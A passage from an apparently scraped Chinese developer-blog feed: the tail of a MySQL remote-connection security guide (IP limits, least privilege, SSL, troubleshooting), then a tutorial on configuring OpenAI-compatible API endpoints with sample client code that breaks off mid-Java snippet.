<pre><code class="hljs language-scss" lang="scss">你的电脑(<span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>) ←→ 虚拟网络 ←→ 服务器(<span class="hljs-number">192.168</span>.<span class="hljs-number">100.1</span>)
                                        └── <span class="hljs-built_in">MySQL</span>(<span class="hljs-number">192.168</span>.<span class="hljs-number">100.1</span>:<span class="hljs-number">3306</span>)
</code></pre>
<p>这样直接连内网IP就行：</p>
<pre><code class="hljs language-bash" lang="bash">mysql -h 192.168.100.1 -P 3306 -u dev -p
</code></pre>
<p>我自己用的是星空组网，配置比较简单，装个客户端就能用。特别是公司有多台服务器的情况，组好网后运维方便很多，不用每台机器都配SSH隧道。</p>
<hr/>
<h2 data-id="heading-9">安全配置</h2>
<p>远程连接开了，安全措施得跟上。</p>
<h3 data-id="heading-10">1. 限制访问IP</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 只允许特定IP连接</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'dev'</span>@<span class="hljs-string">'192.168.1.%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'password'</span>;
<span class="hljs-comment">-- 只允许192.168.1.x网段</span>

<span class="hljs-comment">-- 或者更精确</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'dev'</span>@<span class="hljs-string">'192.168.1.100'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'password'</span>;
</code></pre>
<h3 data-id="heading-11">2. 最小权限原则</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 别给ALL PRIVILEGES，按需授权</span>
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span>, <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">ON</span> app_db.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'app_user'</span>@<span class="hljs-string">'%'</span>;

<span class="hljs-comment">-- 开发环境可以宽松点</span>
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span>, <span class="hljs-keyword">UPDATE</span>, <span class="hljs-keyword">DELETE</span>, <span class="hljs-keyword">CREATE</span>, <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">ON</span> dev_db.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'dev'</span>@<span class="hljs-string">'%'</span>;

<span class="hljs-comment">-- 只读用户</span>
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ON</span> prod_db.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'readonly'</span>@<span class="hljs-string">'%'</span>;
</code></pre>
<h3 data-id="heading-12">3. 强密码</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- MySQL 8.0 密码策略</span>
<span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'validate_password%'</span>;

<span class="hljs-comment">-- 设置密码策略</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> validate_password.policy <span class="hljs-operator">=</span> MEDIUM;
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> validate_password.length <span class="hljs-operator">=</span> <span class="hljs-number">12</span>;
</code></pre>
<h3 data-id="heading-13">4. 开启SSL</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">require_secure_transport</span> = <span class="hljs-literal">ON</span>
<span class="hljs-attr">ssl-ca</span> = /path/to/ca.pem
<span class="hljs-attr">ssl-cert</span> = /path/to/server-cert.pem
<span class="hljs-attr">ssl-key</span> = /path/to/server-key.pem
</code></pre>
<p>连接时指定SSL：</p>
<pre><code class="hljs language-bash" lang="bash">mysql -h server_ip -u dev -p --ssl-mode=REQUIRED
</code></pre>
<h3 data-id="heading-14">5. 修改默认端口</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">port</span> = <span class="hljs-number">13306</span>
</code></pre>
<p>不能防住专业攻击，但能挡住大部分自动化扫描。</p>
<h3 data-id="heading-15">6. 禁用危险功能</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">local-infile</span> = <span class="hljs-number">0</span>           <span class="hljs-comment"># 禁用LOAD DATA LOCAL</span>
<span class="hljs-attr">skip-symbolic-links</span> = <span class="hljs-number">1</span>    <span class="hljs-comment"># 禁用符号链接</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">连接工具推荐</h2>
<h3 data-id="heading-17">命令行</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基础连接</span>
mysql -h host -P port -u user -p

<span class="hljs-comment"># 指定数据库</span>
mysql -h host -u user -p database_name

<span class="hljs-comment"># 执行SQL文件</span>
mysql -h host -u user -p database_name &lt; script.sql
</code></pre>
<h3 data-id="heading-18">GUI工具</h3>
<p><strong>Navicat</strong>：功能全，收费</p>
<p><strong>DBeaver</strong>：免费开源，支持多种数据库</p>
<p><strong>DataGrip</strong>：JetBrains出品，IDE级别体验</p>
<p><strong>MySQL Workbench</strong>：官方工具，免费</p>
<p>配置SSH隧道（以DBeaver为例）：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 新建连接 → MySQL
<span class="hljs-bullet">2.</span> SSH标签页：
<span class="hljs-bullet">   -</span> 勾选 Use SSH Tunnel
<span class="hljs-bullet">   -</span> Host: 服务器公网IP
<span class="hljs-bullet">   -</span> Port: 22
<span class="hljs-bullet">   -</span> User: SSH用户名
<span class="hljs-bullet">   -</span> Authentication: Public Key
<span class="hljs-bullet">   -</span> Private key: 选择私钥文件
<span class="hljs-bullet">3.</span> Main标签页：
<span class="hljs-bullet">   -</span> Host: localhost
<span class="hljs-bullet">   -</span> Port: 3306
<span class="hljs-bullet">   -</span> Database: 数据库名
<span class="hljs-bullet">   -</span> Username: MySQL用户名
</code></pre>
<hr/>
<h2 data-id="heading-19">常见问题</h2>
<h3 data-id="heading-20">1. Host 'xxx' is not allowed to connect</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看用户的host设置</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>, host <span class="hljs-keyword">FROM</span> mysql.user <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">'your_user'</span>;

<span class="hljs-comment">-- 修改或新增</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'your_user'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'password'</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'your_user'</span>@<span class="hljs-string">'%'</span>;
FLUSH PRIVILEGES;
</code></pre>
<h3 data-id="heading-21">2. Authentication plugin 'caching_sha2_password' cannot be loaded</h3>
<p>MySQL 8.0默认用新的认证方式，老客户端可能不支持：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 改成旧的认证方式</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'your_user'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">'password'</span>;
</code></pre>
<p>或者升级客户端。</p>
<h3 data-id="heading-22">3. Lost connection to MySQL server</h3>
<p>可能原因：</p>
<ul>
<li>网络不稳定</li>
<li>查询执行时间过长</li>
<li>连接超时</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf 调整超时</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">wait_timeout</span> = <span class="hljs-number">28800</span>
<span class="hljs-attr">interactive_timeout</span> = <span class="hljs-number">28800</span>
<span class="hljs-attr">net_read_timeout</span> = <span class="hljs-number">60</span>
<span class="hljs-attr">net_write_timeout</span> = <span class="hljs-number">60</span>
</code></pre>
<h3 data-id="heading-23">4. Too many connections</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看当前连接数</span>
<span class="hljs-keyword">SHOW</span> STATUS <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'Threads_connected'</span>;

<span class="hljs-comment">-- 查看最大连接数</span>
<span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'max_connections'</span>;

<span class="hljs-comment">-- 临时调大</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> max_connections <span class="hljs-operator">=</span> <span class="hljs-number">500</span>;
</code></pre>
<p>永久修改要改my.cnf。</p>
<hr/>
<h2 data-id="heading-24">总结</h2>
<p>MySQL远程连接的安全姿势：</p>
<ol>
<li><strong>不要把3306直接暴露公网</strong></li>
<li><strong>用SSH隧道</strong>或<strong>组网方案</strong>连接</li>
<li><strong>限制用户访问IP</strong></li>
<li><strong>最小权限原则</strong></li>
<li><strong>开启SSL加密</strong></li>
</ol>
<p>记住：方便和安全往往是矛盾的。图方便开放所有权限，迟早出事。</p>
<hr/>
<p>有问题评论区聊。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI Compatible (OpenAI API系列)配置方法]]></title>    <link>https://juejin.cn/post/7590128405350285312</link>    <guid>https://juejin.cn/post/7590128405350285312</guid>    <pubDate>2026-01-02T05:08:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590128405350285312" data-draft-id="7590104561475026996" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI Compatible (OpenAI API系列)配置方法"/> <!----> <meta itemprop="datePublished" content="2026-01-02T05:08:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户254322810282"/> <meta itemprop="url" content="https://juejin.cn/user/2904241920817561"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI Compatible (OpenAI API系列)配置方法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2904241920817561/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户254322810282
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T05:08:51.000Z" title="Fri Jan 02 2026 05:08:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">OpenAI Compatible (OpenAI API系列)配置方法</h2>
<p>配置 <strong>OpenAI Compatible (OpenAI 兼容)</strong>  模式是目前连接各种大模型服务（如 DeepSeek、SiliconFlow、Moonshot、Ollama 等）最通用的方法。</p>
<p>只要软件（如 Cursor, Cline, LangChain, AutoGen 等）支持 OpenAI 格式，你就可以通过只需修改 <strong>三个核心参数</strong> 来接入任何支持该标准的服务商。</p>
<p>以下是通用的配置方法整理：</p>
<h4 data-id="heading-1">1. 核心三大参数</h4>
<p>无论你在哪个软件中配置，只需要关注这三个关键信息：</p>

























<table><thead><tr><th align="left">参数名</th><th align="left">通用解释</th><th align="left">典型格式 / 示例</th></tr></thead><tbody><tr><td align="left">​<strong>Base URL</strong>(API 域名/地址)</td><td align="left">服务商的接口地址。这是“欺骗”软件以为它在访问 OpenAI 的关键。</td><td align="left">​<code>https://api.provider.com/v1</code>​ <em>(注意：绝大多数必须以</em>​ <em>​<code>/v1</code>​</em>​<em>结尾)</em></td></tr><tr><td align="left">​<strong>API Key</strong>(密钥)</td><td align="left">你的身份凭证。</td><td align="left">​<code>sk-xxxxxxxxxxxxxx</code></td></tr><tr><td align="left">​<strong>Model Name</strong>(模型 ID)</td><td align="left">你想调用的具体模型名称。</td><td align="left">​<code>deepseek-chatdeepseek-ai/DeepSeek-V3llama3:8b</code></td></tr></tbody></table>
<hr/>
<h4 data-id="heading-2">2. 常用服务商配置速查表</h4>
<p>你可以直接复制下表中的 <strong>Base URL</strong> 和 <strong>常用 Model ID</strong> 到你的软件设置中。</p>















































<table><thead><tr><th align="left">服务商</th><th align="left">Base URL (API地址)</th><th align="left">常用 Model ID (示例)</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>DeepSeek (官方)</strong></td><td align="left">​<code>https://api.deepseek.com/v1</code></td><td align="left">​<code>deepseek-chat</code>​(对应 V3)<code>deepseek-reasoner</code>(对应 R1)</td><td align="left">官方最稳定</td></tr><tr><td align="left"><strong>硅基流动 (SiliconFlow)</strong></td><td align="left">​<code>https://api.siliconflow.cn/v1</code></td><td align="left">​<code>deepseek-ai/DeepSeek-V3deepseek-ai/DeepSeek-R1</code></td><td align="left">需要填写完整路径</td></tr><tr><td align="left"><strong>月之暗面 (Moonshot)</strong></td><td align="left">​<code>https://api.moonshot.cn/v1</code></td><td align="left">​<code>moonshot-v1-8kmoonshot-v1-32k</code></td><td align="left">Kimi 的底层模型</td></tr><tr><td align="left"><strong>智谱 AI (BigModel)</strong></td><td align="left">​<code>https://open.bigmodel.cn/api/paas/v4</code></td><td align="left">​<code>glm-4glm-4-flash</code></td><td align="left">​<strong>注意</strong>​: 智谱是个例，通常用<code>/v4</code></td></tr><tr><td align="left"><strong>Ollama (本地运行)</strong></td><td align="left">​<code>http://localhost:11434/v1</code></td><td align="left">​<code>llama3qwen2.5</code></td><td align="left">用于本地跑模型</td></tr><tr><td align="left"><strong>vLLM / LMDeploy</strong></td><td align="left">​<code>http://&lt;你的IP&gt;:8000/v1</code></td><td align="left">(取决于你部署时指定的模型名)</td><td align="left">自建推理服务常用</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-3">3. 详细配置步骤（通用模板）</h4>
<p>假设你在使用任何支持 OpenAI 的工具（如 VS Code 插件、Python 脚本、Chatbox 等）：</p>
<ol>
<li>
<p>​<strong>选择提供商 (Provider)</strong> ：</p>
<ul>
<li>在设置里找到 "Provider" 或 "API Type" 选项。</li>
<li><strong>不要选</strong> "OpenAI"（这通常锁定为 api.openai.com）。</li>
<li><strong>必须选</strong> ​ <strong>"OpenAI Compatible"</strong> ​、 <strong>"Custom OpenAI"</strong>  或 ​ <strong>"Local AI"</strong> 。</li>
</ul>
</li>
<li>
<p>​<strong>填写 Base URL</strong>：</p>
<ul>
<li>填入服务商提供的地址。</li>
<li>​<strong>关键点</strong>​：如果软件报错，尝试在该地址后面加上 <code>/v1</code>​，或者去掉 <code>/v1</code>​ 试试。90% 的软件需要带 <code>/v1</code>。</li>
<li>​<em>错误示例</em>​：<code>https://api.deepseek.com/chat/completions</code> (这是完整路径，不是 Base URL)</li>
<li>​<em>正确示例</em>​：<code>https://api.deepseek.com/v1</code></li>
</ul>
</li>
<li>
<p>​<strong>填写 API Key</strong>：</p>
<ul>
<li>粘贴 <code>sk-</code> 开头的密钥。</li>
</ul>
</li>
<li>
<p>​<strong>填写 Model ID</strong>：</p>
<ul>
<li>这里不能瞎填，必须精确匹配服务商列表里的名字。</li>
<li>例如在 DeepSeek 官方填 <code>deepseek-v3</code>​ 是无效的，必须填 <code>deepseek-chat</code>。</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-4">4. 常见避坑指南</h4>
<ul>
<li>
<p>​<strong>关于</strong>  <strong>​<code>/v1</code>​</strong>​ <strong>的玄学</strong>：</p>
<ul>
<li>标准 OpenAI 库会自动拼接 <code>/chat/completions</code>。</li>
<li>如果你填写的 Base URL 是 <code>.../v1/chat/completions</code>​，软件拼接后会变成 <code>.../v1/chat/completions/chat/completions</code>​，导致 ​<strong>404 错误</strong>。</li>
<li>​<strong>结论</strong>​：通常只填到 <code>/v1</code> 即可。</li>
</ul>
</li>
<li>
<p>​<strong>模型名称不要带空格</strong>：</p>
<ul>
<li>复制模型 ID 时，注意前后不要有空格。</li>
</ul>
</li>
<li>
<p>​<strong>HTTPS vs HTTP</strong>：</p>
<ul>
<li>远程服务（DeepSeek, SiliconFlow）必须用 <code>https://</code>。</li>
<li>本地服务（Ollama）通常用 <code>http://</code>。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">5. Python 代码测试模板</h4>
<p>下面以轨迹流动为例子：</p>
<h4 data-id="heading-6">⚙️ 配置参数对照表</h4>
<p>在运行以下代码前，请确保你已经准备好了对应的环境。</p>

























<table><thead><tr><th>配置项</th><th>说明</th><th>示例值</th></tr></thead><tbody><tr><td><strong>Base URL</strong></td><td>API 基础地址</td><td>​<code>https://api.siliconflow.cn/v1</code></td></tr><tr><td><strong>API Key</strong></td><td>你的授权密钥</td><td>​<code>sk-xxxxxxxxxxxxxxxxxxxxxxxx</code></td></tr><tr><td><strong>Model</strong></td><td>使用的模型名称</td><td>​<code>deepseek-ai/DeepSeek-V3</code></td></tr></tbody></table>
<hr/>
<h5 data-id="heading-7">1.Python测试模板</h5>
<p>如果你不确定配置是否正确，可以用这段最简 Python 代码测试一下（需要安装 <code>pip install openai</code>）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

<span class="hljs-comment"># 1. 替换为你的 Base URL</span>
base_url = <span class="hljs-string">"https://api.siliconflow.cn/v1"</span> 
<span class="hljs-comment"># 2. 替换为你的 API Key</span>
api_key = <span class="hljs-string">"sk-xxxxxxxxxxxxxxxxxxxxxxxx"</span>
<span class="hljs-comment"># 3. 替换为正确的模型名称</span>
model = <span class="hljs-string">"deepseek-ai/DeepSeek-V3"</span>

client = OpenAI(api_key=api_key, base_url=base_url)

<span class="hljs-keyword">try</span>:
    response = client.chat.completions.create(
        model=model,
        messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"测试一下，回复'配置成功'"</span>}],
        stream=<span class="hljs-literal">False</span>
    )
    <span class="hljs-built_in">print</span>(response.choices[<span class="hljs-number">0</span>].message.content)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"配置错误: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<h5 data-id="heading-8">2. cURL (最快捷的命令行测试)</h5>
<p>这是最简单的方法，无需安装任何编程语言环境，直接在终端执行即可。</p>
<pre><code class="hljs language-bash" lang="bash">curl --location <span class="hljs-string">"https://api.siliconflow.cn/v1/chat/completions"</span> \
--header <span class="hljs-string">"Authorization: Bearer sk-xxxxxxxxxxxxxxxxxxxxxxxx"</span> \
--header <span class="hljs-string">"Content-Type: application/json"</span> \
--data <span class="hljs-string">'{
    "model": "deepseek-ai/DeepSeek-V3",
    "messages": [
        {
            "role": "user",
            "content": "测试一下，回复'</span>\<span class="hljs-string">''</span>配置成功<span class="hljs-string">'\'</span><span class="hljs-string">'"
        }
    ],
    "stream": false
}'</span>
</code></pre>
<hr/>
<h5 data-id="heading-9">3. Node.js (使用 OpenAI 官方 SDK)</h5>
<p>首先需要安装 SDK：<code>npm install openai</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">OpenAI</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"openai"</span>);

<span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
    <span class="hljs-attr">apiKey</span>: <span class="hljs-string">"sk-xxxxxxxxxxxxxxxxxxxxxxxx"</span>,
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">"https://api.siliconflow.cn/v1"</span>
});

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> client.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
            <span class="hljs-attr">model</span>: <span class="hljs-string">"deepseek-ai/DeepSeek-V3"</span>,
            <span class="hljs-attr">messages</span>: [{ <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">"测试一下，回复'配置成功'"</span> }],
            <span class="hljs-attr">stream</span>: <span class="hljs-literal">false</span>,
        });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>);
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`配置错误: <span class="hljs-subst">${error.message}</span>`</span>);
    }
}

<span class="hljs-title function_">main</span>();
</code></pre>
<hr/>
<h5 data-id="heading-10">4. Go (使用标准 http 库)</h5>
<p>Go 语言不依赖第三方库的实现方式：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"bytes"</span>
	<span class="hljs-string">"encoding/json"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"io/ioutil"</span>
	<span class="hljs-string">"net/http"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	url := <span class="hljs-string">"https://api.siliconflow.cn/v1/chat/completions"</span>
	apiKey := <span class="hljs-string">"sk-xxxxxxxxxxxxxxxxxxxxxxxx"</span>
	
	payload := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}{
		<span class="hljs-string">"model"</span>: <span class="hljs-string">"deepseek-ai/DeepSeek-V3"</span>,
		<span class="hljs-string">"messages"</span>: []<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>{
			{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"测试一下，回复'配置成功'"</span>},
		},
	}
	
	jsonPayload, _ := json.Marshal(payload)
	req, _ := http.NewRequest(<span class="hljs-string">"POST"</span>, url, bytes.NewBuffer(jsonPayload))
	
	req.Header.Set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span>+apiKey)
	req.Header.Set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json"</span>)
	
	client := &amp;http.Client{}
	resp, err := client.Do(req)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		fmt.Printf(<span class="hljs-string">"请求错误: %v\n"</span>, err)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">defer</span> resp.Body.Close()
	
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(<span class="hljs-type">string</span>(body))
}
</code></pre>
<hr/>
<h5 data-id="heading-11">5. Java (使用 OkHttp 库)</h5>
<p>这是 Java 开发中常用的轻量级网络库实现方案：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> okhttp3.*;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SiliconFlowTest</span> {
